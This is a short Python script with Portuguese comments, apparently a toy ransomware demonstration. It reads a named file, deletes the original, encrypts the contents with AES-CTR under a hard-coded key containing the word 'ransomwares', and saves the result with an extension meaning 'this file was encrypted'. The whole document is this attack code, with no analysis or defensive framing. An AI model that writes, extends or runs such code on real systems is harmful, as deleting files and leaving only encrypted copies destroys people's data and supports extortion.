import os
import pyaes

## abre o arquivo para criptografar
file_name = "meuarquivo.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remove o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografa
crypto_data = aes.encrypt(file_data)

## salvar o arquivo novo
new_file = file_name + ".estearquivofoicriptografado"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
